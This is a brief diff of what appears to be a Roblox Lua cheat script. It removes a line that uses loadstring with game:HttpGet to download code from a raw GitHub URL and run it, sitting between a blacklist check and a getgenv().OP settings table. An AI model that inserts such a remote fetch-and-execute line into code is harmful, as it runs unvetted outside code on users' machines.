@@ -16,7 +16,6 @@ else
 print("Not Blacklisted :)")
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/smd/main/123"))()
 
 getgenv().OP = 
 {
